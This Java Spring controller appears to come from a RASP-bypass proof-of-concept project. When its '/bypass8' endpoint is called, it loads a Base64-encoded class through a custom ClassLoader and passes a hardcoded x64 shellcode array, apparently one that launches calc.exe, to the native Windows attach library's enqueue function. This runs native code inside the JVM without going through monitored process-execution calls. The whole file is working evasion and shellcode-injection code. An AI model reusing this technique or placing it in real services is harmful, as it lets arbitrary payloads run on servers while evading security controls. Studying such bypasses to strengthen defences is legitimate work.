package com.example.raspbypass.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Base64;

@Controller
@RequestMapping("/bypass8")
public class Bypass8 {
    //only Windows

    public static class Myloader extends ClassLoader //继承ClassLoader
    {
        public Class get(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

//package sun.tools.attach;
//
//import java.io.IOException;
//import java.util.Scanner;
//
//public class WindowsVirtualMachine {
//    static native void enqueue(long hProcess, byte[] stub,
//                            String cmd, String pipename, Object... args) throws IOException;
//
//    static native long openProcess(int pid) throws IOException;
//
//    public static void run(byte[] buf) {
//        System.loadLibrary("attach");
//        try {
//            enqueue(-1, buf, "test", "test", new Object[]{});
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
//}
    @GetMapping("/")
    public static void bypass8(HttpServletResponse response)  {
        try {
            byte shellcode[] = new byte[]{(byte) 0xfc, (byte) 0x48, (byte) 0x83, (byte) 0xe4, (byte) 0xf0, (byte) 0xe8, (byte) 0xc0, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x51, (byte) 0x41, (byte) 0x50, (byte) 0x52, (byte) 0x51, (byte) 0x56, (byte) 0x48, (byte) 0x31, (byte) 0xd2, (byte) 0x65, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x60, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x18, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x20, (byte) 0x48, (byte) 0x8b, (byte) 0x72, (byte) 0x50, (byte) 0x48, (byte) 0x0f, (byte) 0xb7, (byte) 0x4a, (byte) 0x4a, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0, (byte) 0xac, (byte) 0x3c, (byte) 0x61, (byte) 0x7c, (byte) 0x02, (byte) 0x2c, (byte) 0x20, (byte) 0x41, (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1, (byte) 0xe2, (byte) 0xed, (byte) 0x52, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x20, (byte) 0x8b, (byte) 0x42, (byte) 0x3c, (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x8b, (byte) 0x80, (byte) 0x88, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x85, (byte) 0xc0, (byte) 0x74, (byte) 0x67, (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x50, (byte) 0x8b, (byte) 0x48, (byte) 0x18, (byte) 0x44, (byte) 0x8b, (byte) 0x40, (byte) 0x20, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0xe3, (byte) 0x56, (byte) 0x48, (byte) 0xff, (byte) 0xc9, (byte) 0x41, (byte) 0x8b, (byte) 0x34, (byte) 0x88, (byte) 0x48, (byte) 0x01, (byte) 0xd6, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0, (byte) 0xac, (byte) 0x41, (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1, (byte) 0x38, (byte) 0xe0, (byte) 0x75, (byte) 0xf1, (byte) 0x4c, (byte) 0x03, (byte) 0x4c, (byte) 0x24, (byte) 0x08, (byte) 0x45, (byte) 0x39, (byte) 0xd1, (byte) 0x75, (byte) 0xd8, (byte) 0x58, (byte) 0x44, (byte) 0x8b, (byte) 0x40, (byte) 0x24, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0x66, (byte) 0x41, (byte) 0x8b, (byte) 0x0c, (byte) 0x48, (byte) 0x44, (byte) 0x8b, (byte) 0x40, (byte) 0x1c, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0x41, (byte) 0x8b, (byte) 0x04, (byte) 0x88, (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x58, (byte) 0x5e, (byte) 0x59, (byte) 0x5a, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x41, (byte) 0x5a, (byte) 0x48, (byte) 0x83, (byte) 0xec, (byte) 0x20, (byte) 0x41, (byte) 0x52, (byte) 0xff, (byte) 0xe0, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x5a, (byte) 0x48, (byte) 0x8b, (byte) 0x12, (byte) 0xe9, (byte) 0x57, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0x5d, (byte) 0x48, (byte) 0xba, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x8d, (byte) 0x8d, (byte) 0x01, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0xba, (byte) 0x31, (byte) 0x8b, (byte) 0x6f, (byte) 0x87, (byte) 0xff, (byte) 0xd5, (byte) 0xbb, (byte) 0xf0, (byte) 0xb5, (byte) 0xa2, (byte) 0x56, (byte) 0x41, (byte) 0xba, (byte) 0xa6, (byte) 0x95, (byte) 0xbd, (byte) 0x9d, (byte) 0xff, (byte) 0xd5, (byte) 0x48, (byte) 0x83, (byte) 0xc4, (byte) 0x28, (byte) 0x3c, (byte) 0x06, (byte) 0x7c, (byte) 0x0a, (byte) 0x80, (byte) 0xfb, (byte) 0xe0, (byte) 0x75, (byte) 0x05, (byte) 0xbb, (byte) 0x47, (byte) 0x13, (byte) 0x72, (byte) 0x6f, (byte) 0x6a, (byte) 0x00, (byte) 0x59, (byte) 0x41, (byte) 0x89, (byte) 0xda, (byte) 0xff, (byte) 0xd5, (byte) 0x63, (byte) 0x61, (byte) 0x6c, (byte) 0x63, (byte) 0x2e, (byte) 0x65, (byte) 0x78, (byte) 0x65, (byte) 0x00};
            String classStr = "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";
            Class result = new Myloader().get(Base64.getDecoder().decode(classStr));
            for (Method m : result.getDeclaredMethods()) {
                System.out.println(m.getName());
                if (m.getName().equals("run")) {
                    m.invoke(result, shellcode);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            response.getWriter().write("OK!");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}



